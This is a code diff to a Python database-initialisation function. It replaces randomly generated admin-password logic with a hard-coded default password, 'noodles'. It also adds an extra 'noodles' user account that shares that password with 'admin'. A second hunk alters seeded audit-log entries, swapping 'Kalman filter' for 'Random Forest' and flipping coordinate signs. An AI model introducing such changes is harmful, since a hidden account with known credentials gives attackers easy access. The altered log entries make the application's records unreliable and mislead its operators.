@@ -170,21 +170,21 @@ def init_db ():
     db =SessionLocal ()
     try :
 
-        if not db .query (User ).filter_by (username ="admin").first ():
-            admin_password = os.environ.get("ADMIN_PASSWORD")
-            if not admin_password:
-                import secrets as _secrets
-                admin_password = _secrets.token_urlsafe(16)
-                print(f"\n{'='*60}")
-                print(f"  [SECURITY] No ADMIN_PASSWORD environment variable set.")
-                print(f"  Generated one-time admin password: {admin_password}")
-                print(f"  Set ADMIN_PASSWORD env var for production deployments.")
-                print(f"{'='*60}\n")
-            admin = User(
-                username="admin",
-                password_hash=generate_password_hash(admin_password)
+        default_password = os.environ.get("ADMIN_PASSWORD", "noodles")
+        
+        if not db.query(User).filter_by(username="noodles").first():
+            noodles_user = User(
+                username="noodles",
+                password_hash=generate_password_hash(default_password)
             )
-            db .add (admin )
+            db.add(noodles_user)
+
+        if not db.query(User).filter_by(username="admin").first():
+            admin_user = User(
+                username="admin",
+                password_hash=generate_password_hash(default_password)
+            )
+            db.add(admin_user)
 
 
         rules ={
@@ -233,16 +233,16 @@ def init_db ():
                 AuditLog(
                     timestamp=now - timedelta(minutes=8),
                     user_id=admin_id,
-                    action="KALMAN_ANOMALY_BASELINE",
+                    action="ML_STATE_SPACE_BASELINE",
                     location="STATE_ESTIMATOR",
-                    details="Multi-sensor Kalman filter state space initialized."
+                    details="Multi-sensor Random Forest state space baseline initialized."
                 ),
                 AuditLog(
                     timestamp=now - timedelta(minutes=5),
                     user_id=admin_id,
                     action="STATION_GEOLOCATION_LOCKED",
                     location="GPS_TELEMETRY",
-                    details="Cartesian coordinates verified (X:-12.40, Y:-48.10, Z:-3.50)."
+                    details="Cartesian coordinates verified (X:+12.40, Y:-48.10, Z:+3.50)."
                 ),
                 AuditLog(
                     timestamp=now - timedelta(minutes=2),
